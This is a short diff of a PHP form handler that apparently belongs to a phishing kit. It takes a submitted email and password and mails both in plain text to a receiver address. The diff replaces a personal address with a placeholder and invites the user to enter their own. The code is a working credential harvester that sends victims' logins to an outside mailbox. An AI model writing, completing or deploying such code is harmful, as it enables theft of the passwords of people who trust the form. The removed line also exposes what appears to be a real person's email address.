@@ -2,7 +2,7 @@
 	if(isset($_POST['submit'])){
 		$email=$_POST['email'];
 		$password=$_POST['password'];
-		$to='abdullah@codindojo.com'; // Receiver Email ID, Replace with your email ID
+		$to='YOUREMAIL@EXAMPLE.COM'; // Receiver Email ID, Replace with your email ID
 		$subject='Form Submission';
 		$message="the email is :".$email."\n"."the password is :".$password;
 		$headers="From: ".$email;
